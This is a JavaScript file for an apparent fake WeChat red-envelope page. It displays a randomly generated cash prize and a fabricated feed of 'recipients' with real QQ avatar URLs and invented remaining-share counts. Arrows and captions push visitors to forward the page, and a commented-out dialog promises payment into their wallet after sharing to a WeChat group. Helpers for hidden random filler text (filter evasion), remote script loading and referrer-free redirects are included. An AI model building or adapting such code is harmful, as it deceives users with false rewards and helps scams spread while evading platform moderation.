function find(el) {
    return document.querySelector(el);
}
function insertScript(link, callback) {
    var label = document.createElement('script');
    label.src = link;
    label.onload = function () {
        if (typeof callback === 'function') callback();
    }
    document.body.appendChild(label);
}
function randomText() {
    var len = 32;
    var i = 0;
    var str = '';
    var base = 20000;
    var range = 1000;
    while (i < len) {
        i++;
        var lower = parseInt(Math.random() * range);
        str += String.fromCharCode(base + lower);
    }
    return str;
}
function createLabel(total) {
    var labelNames = ['div', 'li', 'ul', 'p', 'a', 'span', 'h2', 'i'];
    for (var i = 0; i < total; i++) {
        var name = labelNames[Math.floor(Math.random() * labelNames.length)];
        var label = document.createElement(name);
        label.style.display = 'none';
        label.textContent = randomText();
        document.body.appendChild(label);
    }
}
function getId(value) {
    var id = Math.random().toString(36).substr(2);
    if (value == id) {
        return getId(value);
    }
    return id;
}
function randomNum(min, max, hex) {
    var number = 0;
    var value = hex ? Math.pow(10, hex) : 1;
    number = Math.floor(Math.random() * (max * value - min * value + 1)) + min * value;
    if (hex) {
        number = (number / value).toFixed(hex);
    }
    return number;
}
var MONEY_VALUE = 100;
function getMoney() {
        var number = 0;
        number = Math.floor(Math.random() * 50 * MONEY_VALUE) + (100 * MONEY_VALUE);
        number /= MONEY_VALUE;
        return number.toFixed(2);
}

var total_id = getId();
var id = getUrlParam('id');
var shareTipReady = false;
var money = getMoney();
var totalMoney = Math.floor(Math.random() * (500000 - 200000) + 200000);
var year = Math.floor(Math.random() * (9 - 1) + 1);
var month = randomNum(100000, 200000);
var step = 0;

function numberAnimation(el, options) {
    var time = options.time || 1000;
    var finalNum = options.number || 192.22;
    var regulator = options.regulator || 100;
    var step = finalNum / (time / regulator);
    var count = 0;
    var initial = 0;

    var timer = setInterval(function () {
        count = Math.floor((count + step) * 100) / 100;
        if (count >= finalNum) {
            clearInterval(timer);
            count = finalNum;
            shareTipReady = true;
        }
        var t = Number(count);
        if (t == initial) return;
        initial = t;
        el.innerHTML = initial.toFixed(2);
    }, 30);
}

function outputUserList() {

    var userList = [{
        "name": "奥利力~",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100",
    }, {
        "name": "吹风少年",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100",
    }, {
        "name": "足球大将",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100",
    }, {
        "name": "刘二哥",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100",
    }, {
        "name": "F.I.R",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100",
    }, {
        "name": "山里得铁柱",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100",
    }, {
        "name": "云千万",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100",
    }, {
        "name": "梁斌",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100",
    }, {
        "name": "魔法师蛋小丁",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100",
    }, {
        "name": "连普经理",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100",
    }, {
        "name": "陈萌萌",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100",
    }, {
        "name": "张全蛋",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100",
    }, {
        "name": "爱你一万年",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100",
    }, {
        "name": "日子更好",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100",
    }, {
        "name": "已婚少女",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100",
    }, {
        "name": "叫我软软",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100",
    }, {
        "name": "静香",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100",
    }, {
        "name": "GHI~",
        "avatar": "https://q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100",
    }];

    userList.sort(function () {
        return Math.random() > 0.5 ? -1 : 1;
    });
    var index = Math.floor(Math.random() * userList.length);
    var total = 10;
    var radius = Math.floor(Math.random() * 50);
    var animation = Math.floor(Math.random() * 4) + 1;
    var listTime = Math.floor(Math.random() * 500) + 1800;
    var totalMoneyEl = document.getElementById(total_id);

    function getTime(num) {
        var interval = num || 5;
        var _date = new Date(new Date().getTime() - interval * 60 * 1000);
        var hour = ('0' + _date.getHours()).slice(-2);
        var minute = ('0' + _date.getMinutes()).slice(-2);
        var second = ('0' + _date.getSeconds()).slice(-2);
        return hour + ':' + minute;
    }

    var ns = 190145;
    function createUserItem(info) {
        var item = document.createElement('div');
        var _money = getMoney();
        item.style.cssText = 'width: 100%; height: 60px; overflow: hidden; box-sizing: border-box; padding: 0 10px; border-bottom: 1px solid rgba(0, 0, 0, .05); display: -webkit-box; display: flex; flex-wrap: wrap; align-items: center; justify-content: center;';
        item.innerHTML = '<img style="width: 40px; height: 40px; margin-right: 10px; overflow: hidden; background-color: #eee; border-radius: ' + radius + '%" src="' + info.avatar + '">\
                            <div style="flex: 1;">\
                                <div style="font-size: 15px; color: #000; margin-bottom: 4px;">' + info.name + '</div>\
                                <div style="font-size: 14px; color: #929493;">' + getTime(index + 5) + '</div>\
                            </div>\
                            <div style="text-align: right;">\
                              <img src="./images/ylq.jpg" width=40px height=40px /></span>\
                            </div>';

        totalMoney -= Number(_money);
        ns -= Math.floor(Math.random()*300)
        totalMoneyEl.textContent = '紅包总计200000份 剩余' + ns+ '份';
        return item;
    }
    var listBox = document.createElement('div');
    listBox.style.cssText = 'width: 100%; background-color: rgba(255,255,255,0.1); overflow: hidden; border-radius: 5px; height: 600px;';
    while (total > 0) {
        listBox.appendChild(createUserItem(userList[index]));
        index++;
        if (index >= userList.length) index = 0;
        total--;
    }
    find('.page').appendChild(listBox);
    function putNode() {
        var item = listBox.lastChild;
        item.parentNode.removeChild(item);
        var newItem = createUserItem(userList[index]);
        newItem.style.animation = 'itemMove' + animation + ' 0.5s';
        listBox.insertBefore(newItem, listBox.firstChild);
        index++;
        if (index >= userList.length) index = 0;
    }

    var timer = setInterval(function () {
        if (!listBox.parentNode) return clearInterval(timer);
        putNode();
    }, listTime);
}

function getColor(type) {
    var a = Math.floor(Math.random() * 45) + 210;
    var b = Math.floor(Math.random() * 35) + 220;
    if (type) {
        return 'rgb(' + b + ', 205, 155)';
    } else {
        return 'rgb(' + a + ', 94, 77)';
    }
}

function scaleValue() {
    var number = Math.floor(Math.random() * 30) + 90;
    return number / 100;
}

var sizeValue = scaleValue();
var color = getColor();
var gold = getColor(true);
var bg_img='./images/logo.png';
var cm_title='XXX给您的红包！';
var zhuanfa=['转发~点这里','点击分享','右上角分享','点击这里分享','點擊這裏分享','點擊分享','亲,请转发','親,請轉發'];
var urlArr = [ 'arrow1.png', 'arrow2.png', 'arrow3.png', 'arrow4.png', 'arrow5.png', 'arrow6.png', 'arrow7.png', ];
var jiantou='<div  class="tip" style="opacity:.8;position:fixed;z-index:999;top:10px;right:10px;overflow:hidden;text-align:center;color:#fff;font-size:15px;animation:tipMove 1.5s infinite"><img src="http://cdn1.xiaoyewuliu.com/wxhb/image/jt/'+urlArr[randomNum(0, urlArr.length-1)]+'" style="width:80px;height:90px;"><div style="transform:translateY(-100%)">'+zhuanfa[randomNum(0,7)]+'</div></div>';
function initPage() {
    var label_total = Math.floor(Math.random() * 10) + 10;
    var radian = Math.floor(Math.random() * 9) + 15;
    var _html = '<div class="page" onclick="youdao()" style="height: 100vh; overflow: hidden; background-color: #fff;">\
                    <div style=" height: 300px; border: 1px solid ' + color + '; background-color: ' + color + '; border-radius: 0px 0px 50% 50% / 10px 10px ' + radian + '% ' + radian + '%; margin-bottom: 20px ">\
                        <img src="' + bg_img + '"\
                            style="width:50%;margin: 0 auto 0; display: block;padding-top: 20px;">\
                        <p style="font-size: 18px;color: ' + gold + '; text-align: center;padding-top: 10px">' + cm_title + '</p>\
                        <p style="font-size: 40px;text-align: center;padding-top: 5px;color: ' + gold + '; font-weight: bold">\
                            <span data-time>0</span>\
                        </p>'+jiantou+'\
                        <p id="squn" style="font-size: 16px;color: ' + gold + '; text-align: center;padding-top: 5px; display:block">该红包可直接抵扣</p>\
                        <p class="btn" onclick="youdao()" style=" background: #ffe4b2; color: #f25543; text-align: center;width:80px; margin:auto; border-radius: 9999PX;line-height: 30px;margin-top: 10px;">确认</p>\
                    </div>\
                    <div style="width: 100%; height: 10px; background-color: #eceeed; "></div>\
                    <div id="' + total_id + '" style="font-size: 14px; color:#929493; height: 30px; line-height: 30px; padding-left: 10px; border-bottom: solid 1px rgba(0,0,0,0.05)"></div>\
                </div>';

    //createLabel(label_total);
    document.body.innerHTML += _html;
    //createLabel(label_total);
    var js = document.getElementById('main');
    if (js) js.parentNode.removeChild(js);
    //outputUserList();
    numberAnimation(find('[data-time]'), {
        time: 1000,
        number: Number(money),
        regulator: 50
    });
}


/** 显示弹框提示 */
function youdao(){
    //wxalert('<div style="text-align:center;"><span>请点击右上角按钮并分享到</span><br/><span style="font-size: 23px;color:red;">微信群</span><br/><span style="color:#1BBC9B;">完成后自动存入您的微信钱包</span></div>','<span style="color:#1BBC9B;">好的</span>')
}

function wxalert(msg, btn, callback) {
    var d = $('#lly_dialog');
    d.fadeIn(300)
    find("#lly_dialog_msg").innerHTML = msg;
    find("#lly_dialog_btn").innerHTML = btn;
    $("#lly_dialog_btn").off('click').on('click', function() {
        d.fadeOut(300)
        if (callback) {
            callback()
        }
    })
}

initPage();
var tp = new Date().getTime();
  
function getUrlParam(name) {
    var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)");
    var r = window.location.href.match(reg);
    if (r != null) return unescape(r[2]);
    return null;
}
function noRefJump(url){ 
    var a=document.createElement('a');
    a.href=url; a.rel='noreferrer';
    a.click(); 
}




